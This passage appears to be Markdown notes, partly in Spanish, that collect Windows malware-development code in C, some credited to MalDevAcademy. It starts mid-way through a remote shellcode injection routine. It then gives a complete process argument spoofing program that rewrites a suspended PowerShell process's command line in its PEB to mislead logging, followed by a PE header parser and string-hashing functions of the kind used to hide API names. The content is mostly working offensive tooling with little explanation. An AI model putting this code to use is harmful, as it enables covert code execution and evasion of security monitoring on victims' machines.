        printf("Error el cambiar protecc√≠on de memoria...\n");
        return -1;
    
    }

    printf("Enter para ejectuar shellcode...\n");
    getchar();
    
    HANDLE hThread2 = CreateRemoteThread(hProcess, NULL, NULL, hAddress, NULL, 0, NULL);
    if (hThread2 == NULL) {
        printf("Error al crear thread");
        return -1;
    
    }

    WaitForSingleObject(INFINITE, hThread2);

    return 0;
}
```

# Process Argument Spoofing

```c
#include <stdio.h>
#include <windows.h>
#include <winternl.h>

#define COMANDOMALO L"powershell.exe totalmente leg√≠timo perros"
#define COMANDOBUENO L"powershell.exe -c calc.exe"


typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
    HANDLE           ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID            ProcessInformation,
    ULONG            ProcessInformationLength,
    PULONG           ReturnLength
    );

BOOL CreateProcessArgument(PVOID comandomalo, PVOID comandobueno) {

    STARTUPINFOW Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    PROCESS_BASIC_INFORMATION       PBI = { 0 };
    ULONG                           uRetern = NULL;

    PPEB pPeb = NULL;
    PRTL_USER_PROCESS_PARAMETERS pUser = NULL;

    WCHAR szProcess[MAX_PATH];
    
    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    Si.cb = sizeof(STARTUPINFOW);

    lstrcpyW(szProcess, comandomalo);

    if(!CreateProcessW(NULL, szProcess, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, L"C:\\Windows\\System32", &Si, &Pi)){
        printf("Error al crear proceso...\n");
        return FALSE;
    }

    printf("Proceso creado con id: %d\n", Pi.dwProcessId);

    fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess");
    pNtQueryInformationProcess(
        Pi.hProcess,
        ProcessBasicInformation,
        &PBI,
        sizeof(PROCESS_BASIC_INFORMATION),
        &uRetern
    );

    if (!ReadInformationFromProcess(Pi.hProcess, PBI.PebBaseAddress, &pPeb, sizeof(PEB))) {
        printf("Error el leer PEB... \n");
        return FALSE;
    }


    if (!ReadInformationFromProcess(Pi.hProcess, pPeb->ProcessParameters, &pUser, sizeof(PRTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
        printf("Error el leer process parameters... \n");
        return FALSE;
    }

    wprintf(L"\t[i] Writing \"%s\" As The Process Argument At : 0x%p ... ", comandobueno, pUser ->CommandLine.Buffer);
    if (!WriteInformationProcess(Pi.hProcess, (PVOID)pUser->CommandLine.Buffer, (PVOID)comandobueno, (DWORD)(lstrlenW(comandobueno) * sizeof(WCHAR) + 1))) {
        printf("Error al sobreescrbir argumentos...\n");
        return FALSE;
    
    }

    ResumeThread(Pi.hThread);

    return TRUE;
}

BOOL ReadInformationFromProcess(HANDLE hProcess, LPCVOID pAddress, PVOID* ppAddressToRead, DWORD szAddress) {

    DWORD numberOfBytesToRead = 0;

    *ppAddressToRead = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, szAddress);

    if (!ReadProcessMemory(hProcess, pAddress, *ppAddressToRead, szAddress, &numberOfBytesToRead) || numberOfBytesToRead != szAddress) {
        printf("Error al ejecutar func√≠on para leer PEB...\n");
        return FALSE;
    }

    printf("Lectura de proceso exitoso...\n");
    return TRUE;
}

BOOL WriteInformationProcess(HANDLE hProcess, PVOID pAddress, PVOID comandoBueno, DWORD szComandoBueno) {
    
    SIZE_T numberOfBytesToRead = 0;

    if (!WriteProcessMemory(hProcess, pAddress, comandoBueno, szComandoBueno, &numberOfBytesToRead)) {
        printf("Error el ejecutar funcion de escritura de argumentos...\n");
        return FALSE;
        
    }

    return TRUE;

}

int main() {

    CreateProcessArgument(COMANDOMALO, COMANDOBUENO );

    return 0;
}
```
# Parsing PE Headers

```c
// @NUL0x4C | @mrd0x : MalDevAcademy


#include <Windows.h>
#include <stdio.h>
#include <winternl.h>


// read the `lpFileName` file from disk 
// and return the base address and the size of it
BOOL ReadPeFile(LPCSTR lpFileName, PBYTE* pPe, SIZE_T* sPe) {

    HANDLE  hFile                   = INVALID_HANDLE_VALUE;
    PBYTE   pBuff                   = NULL;
    DWORD   dwFileSize              = NULL,
            dwNumberOfBytesRead     = NULL;

    printf("[i] Reading \"%s\" ... ", lpFileName);

    hFile = CreateFileA(lpFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileA Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }

    dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == NULL) {
        printf("[!] GetFileSize Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }

    pBuff = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
    if (pBuff == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }

    if (!ReadFile(hFile, pBuff, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
        printf("[!] ReadFile Failed With Error : %d \n", GetLastError());
        printf("[!] Bytes Read : %d of : %d \n", dwNumberOfBytesRead, dwFileSize);
        goto _EndOfFunction;
    }

    printf("[+] DONE \n");


_EndOfFunction:
    *pPe = (PBYTE)pBuff;
    *sPe = (SIZE_T)dwFileSize;
    if (hFile)
        CloseHandle(hFile);
    if (*pPe == NULL || *sPe == NULL)
        return FALSE;
    return TRUE;
}



// function to print details of a pe file
// `pPE` is the base address of a pe file in memory

VOID ParsePe (PBYTE pPE) {

    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pPE;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE){
        return;
    }

    
    // 
     


    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pPE + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
        return;
    }


    // 
    printf("\n\t#####################[ FILE HEADER ]#####################\n\n");
    
    IMAGE_FILE_HEADER       ImgFileHdr  = pImgNtHdrs->FileHeader;


    if (ImgFileHdr.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE) {

        printf("[i] Executable File Detected As : ");

        if (ImgFileHdr.Characteristics & IMAGE_FILE_DLL)
            printf("DLL\n");
        else if (ImgFileHdr.Characteristics & IMAGE_SUBSYSTEM_NATIVE)
            printf("SYS\n");
        else
            printf("EXE\n");
    }

    printf("[i] File Arch : %s \n", ImgFileHdr.Machine == IMAGE_FILE_MACHINE_I386 ? "x32" : "x64");
    printf("[i] Number Of Sections : %d \n", ImgFileHdr.NumberOfSections);
    printf("[i] Size Of The Optional Header : %d Byte \n", ImgFileHdr.SizeOfOptionalHeader);


    // 
    printf("\n\t#####################[ OPTIONAL HEADER ]#####################\n\n");

    IMAGE_OPTIONAL_HEADER   ImgOptHdr = pImgNtHdrs->OptionalHeader;
    if (ImgOptHdr.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC) {
        return;
    }

    printf("[i] File Arch (Second way) : %s \n", ImgOptHdr.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC ? "x32" : "x64");


    printf("[+] Size Of Code Section : %d \n", ImgOptHdr.SizeOfCode);
    printf("[+] Address Of Code Section : 0x%p \n\t\t[RVA : 0x%0.8X]\n", (PVOID)(pPE + ImgOptHdr.BaseOfCode), ImgOptHdr.BaseOfCode);
    printf("[+] Size Of Initialized Data : %d \n", ImgOptHdr.SizeOfInitializedData);
    printf("[+] Size Of Unitialized Data : %d \n", ImgOptHdr.SizeOfUninitializedData);
    printf("[+] Preferable Mapping Address : 0x%p \n", (PVOID)ImgOptHdr.ImageBase);
    printf("[+] Required Version : %d.%d \n", ImgOptHdr.MajorOperatingSystemVersion, ImgOptHdr.MinorOperatingSystemVersion);
    printf("[+] Address Of The Entry Point : 0x%p \n\t\t[RVA : 0x%0.8X]\n", (PVOID)(pPE + ImgOptHdr.AddressOfEntryPoint), ImgOptHdr.AddressOfEntryPoint);
    printf("[+] Size Of The Image : %d \n", ImgOptHdr.SizeOfImage);
    printf("[+] File CheckSum : 0x%0.8X \n", ImgOptHdr.CheckSum);
    printf("[+] Number of entries in the DataDirectory array : %d \n", ImgOptHdr.NumberOfRvaAndSizes); // this is the same as `IMAGE_NUMBEROF_DIRECTORY_ENTRIES` - `16`

    
    //
    printf("\n\t#####################[ DIRECTORIES ]#####################\n\n");

    printf("[*] Export Directory At 0x%p Of Size : %d \n\t\t[RVA : 0x%0.8X]\n", 
        (PVOID)(pPE + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress),
        ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size,
        ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    printf("[*] Import Directory At 0x%p Of Size : %d \n\t\t[RVA : 0x%0.8X]\n",
        (PVOID)(pPE + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress),
        ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size,
        ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    printf("[*] Resource Directory At 0x%p Of Size : %d \n\t\t[RVA : 0x%0.8X]\n",
        (PVOID)(pPE + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress),
        ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].Size,
        ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress);

    printf("[*] Exception Directory At 0x%p Of Size : %d \n\t\t[RVA : 0x%0.8X]\n",
        (PVOID)(pPE + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress),
        ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size,
        ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress);

    printf("[*] Base Relocation Table At 0x%p Of Size : %d \n\t\t[RVA : 0x%0.8X]\n",
        (PVOID)(pPE + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress),
        ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size,
        ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

    printf("[*] TLS Directory At 0x%p Of Size : %d \n\t\t[RVA : 0x%0.8X]\n",
        (PVOID)(pPE + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress),
        ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size,
        ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);

    printf("[*] Import Address Table At 0x%p Of Size : %d \n\t\t[RVA : 0x%0.8X]\n",
        (PVOID)(pPE + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress),
        ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size,
        ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress);



    //
    printf("\n\t#####################[ SECTIONS ]#####################\n\n");


    PIMAGE_SECTION_HEADER pImgSectionHdr = (PIMAGE_SECTION_HEADER)(((PBYTE)pImgNtHdrs) + sizeof(IMAGE_NT_HEADERS));
    for (size_t i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
        printf("[#] %s \n", (CHAR*)pImgSectionHdr->Name);
        printf("\tSize : %d \n", pImgSectionHdr->SizeOfRawData);
        printf("\tRVA : 0x%0.8X \n", pImgSectionHdr->VirtualAddress);
        printf("\tAddress : 0x%p \n", (PVOID)(pPE + pImgSectionHdr->VirtualAddress));
        printf("\tRelocations : %d \n", pImgSectionHdr->NumberOfRelocations);
        printf("\tPermissions : ");
        if (pImgSectionHdr->Characteristics & IMAGE_SCN_MEM_READ)
            printf("PAGE_READONLY | ");
        if (pImgSectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE && pImgSectionHdr->Characteristics & IMAGE_SCN_MEM_READ)
            printf("PAGE_READWRITE | ");
        if (pImgSectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE)
            printf("PAGE_EXECUTE | ");
        if (pImgSectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE && pImgSectionHdr->Characteristics & IMAGE_SCN_MEM_READ)
            printf("PAGE_EXECUTE_READWRITE");
        printf("\n\n");

        pImgSectionHdr = (PIMAGE_SECTION_HEADER)((PBYTE)pImgSectionHdr + (DWORD)sizeof(IMAGE_SECTION_HEADER));
    }



}





int main(int argc, char* argv[]) {

    if (argc < 2){
        printf("[!] Please Enter Pe File To Parse ... \n");
        return -1;
    }

    PBYTE   pPE     = NULL;
    SIZE_T  sPE     = NULL;

    if (!ReadPeFile(argv[1], &pPE, &sPE)) {
        return -1;
    }

    printf("[+] \"%s\" Read At : 0x%p Of Size : %d \n", argv[1], pPE, sPE);

    ParsePe(pPE);

    
    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    HeapFree(GetProcessHeap(), NULL, pPE);

    return 0;
}
```

# String Hashing

## Djb2

```c
// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <stdio.h>

// reference: https://github.com/vxunderground/VX-API/blob/main/VX-API/HashStringDjb2.cpp


#define INITIAL_HASH    3731        // added to randomize 
#define INITIAL_SEED    7           // recommended to be 0 < INITIAL_SEED < 10

// generate Djb2 hashes from Ascii input string
DWORD HashStringDjb2A(_In_ PCHAR String)
{
    ULONG Hash = INITIAL_HASH;
    INT c;

    while (c = *String++)
        Hash = ((Hash << INITIAL_SEED) + Hash) + c;

    return Hash;
}

// generate Djb2 hashes from wide-character input string
DWORD HashStringDjb2W(_In_ PWCHAR String)
{
    ULONG Hash = INITIAL_HASH;
    INT c;

    while (c = *String++)
        Hash = ((Hash << INITIAL_SEED) + Hash) + c;

    return Hash;
}


int main() {

    CHAR*   cTest = "MaldevAcademy";
    WCHAR*  wTest = L"MaldevAcademy";
    
    printf("[+] Hash Of \"%s\" Is : 0x%0.8X \n", cTest, HashStringDjb2A(cTest));
    wprintf(L"[+] Hash Of \"%s\" Is : 0x%0.8X \n", wTest, HashStringDjb2W(wTest));


    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    return 0;
}

/*  
    OUTPUT:

[+] Hash Of "MaldevAcademy" Is : 0xB4FEAFA0
[+] Hash Of "MaldevAcademy" Is : 0xB4FEAFA0
*/
```

## Jenkins

```c
// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <stdio.h>

// reference: https://github.com/vxunderground/VX-API/blob/main/VX-API/HashStringJenkinsOneAtATime32Bit.cpp

#define INITIAL_SEED    7   // recommended to be 0 < INITIAL_SEED < 10

// generate JenkinsOneAtATime32Bit hashes from Ascii input string
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenA(String);

    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash << INITIAL_SEED;
        Hash ^= Hash >> 6;
    }

    Hash += Hash << 3;
    Hash ^= Hash >> 11;
    Hash += Hash << 15;

    return Hash;
}

// generate JenkinsOneAtATime32Bit hashes from wide-character input string
UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenW(String);

    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash << INITIAL_SEED;
        Hash ^= Hash >> 6;
    }

    Hash += Hash << 3;
    Hash ^= Hash >> 11;
    Hash += Hash << 15;

    return Hash;
}





int main() {

    CHAR*   cTest   = "MaldevAcademy";
    WCHAR*  wTest   = L"MaldevAcademy";

    printf("[+] Hash Of \"%s\" Is : 0x%0.8X \n", cTest, HashStringJenkinsOneAtATime32BitA(cTest));
    wprintf(L"[+] Hash Of \"%s\" Is : 0x%0.8X \n", wTest, HashStringJenkinsOneAtATime32BitW(wTest));

    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    return 0;
}

/*
    OUTPUT:

[+] Hash Of "MaldevAcademy" Is : 0x1FE854F9
[+] Hash Of "MaldevAcademy" Is : 0x1FE854F9
*/
```

## LoseLose

```c
// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <stdio.h>

// reference: https://github.com/vxunderground/VX-API/blob/main/VX-API/HashStringLoseLose.cpp

#define INITIAL_SEED    2   // recommended to be 0 < INITIAL_SEED < 5

// generate LoseLose hashes from Ascii input string
DWORD HashStringLoseLoseA(_In_ PCHAR String)
{
    ULONG Hash = 0;
    INT c;

    while (c = *String++) {
        Hash += c;
        Hash *= c + INITIAL_SEED;   // update
    }
    return Hash;
}

// generate LoseLose hashes from wide-character input string
DWORD HashStringLoseLoseW(_In_ PWCHAR String)
{
    ULONG Hash = 0;
    INT c;

    while (c = *String++) {
        Hash += c;
        Hash *= c + INITIAL_SEED;   // update
    }

    return Hash;
}




int main() {

    CHAR*   cTest = "MaldevAcademy";
    WCHAR*  wTest = L"MaldevAcademy";

    printf("[+] Hash Of \"%s\" Is : 0x%0.8X \n", cTest, HashStringLoseLoseA(cTest));
    wprintf(L"[+] Hash Of \"%s\" Is : 0x%0.8X \n", wTest, HashStringLoseLoseW(wTest));

    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    return 0;
}

/*
    OUTPUT:

[+] Hash Of "MaldevAcademy" Is : 0x82131A35
[+] Hash Of "MaldevAcademy" Is : 0x82131A35
*/
```

## Rotr32

```c
// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <stdio.h>

// reference: https://github.com/vxunderground/VX-API/blob/main/VX-API/HashStringRotr32.cpp


#define INITIAL_SEED    5   // recommended to be 0 < INITIAL_SEED < 10



// helper function that apply the bitwise rotation
UINT32 HashStringRotr32Sub(UINT32 Value, UINT Count)
{
    DWORD Mask = (CHAR_BIT * sizeof(Value) - 1);
    Count &= Mask;
#pragma warning( push )
#pragma warning( disable : 4146)
    return (Value >> Count) | (Value << ((-Count) & Mask));
#pragma warning( pop ) 
}

// generate Rotr32 hashes from Ascii input string
INT HashStringRotr32A(_In_ PCHAR String)
{
    INT Value = 0;

    for (INT Index = 0; Index < lstrlenA(String); Index++)
        Value = String[Index] + HashStringRotr32Sub(Value, INITIAL_SEED);

    return Value;
}

// generate Rotr32 hashes from wide-character input string
INT HashStringRotr32W(_In_ PWCHAR String)
{
    INT Value = 0;

    for (INT Index = 0; Index < lstrlenW(String); Index++)
        Value = String[Index] + HashStringRotr32Sub(Value, INITIAL_SEED);

    return Value;
}




int main() {

    CHAR*   cTest = "MaldevAcademy";
    WCHAR*  wTest = L"MaldevAcademy";

    printf("[+] Hash Of \"%s\" Is : 0x%0.8X \n", cTest, HashStringRotr32A(cTest));
    wprintf(L"[+] Hash Of \"%s\" Is : 0x%0.8X \n", wTest, HashStringRotr32W(wTest));

    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    return 0;
}

/*
    OUTPUT:

[+] Hash Of "MaldevAcademy" Is : 0xAA4A09DF
[+] Hash Of "MaldevAcademy" Is : 0xAA4A09DF
*/
```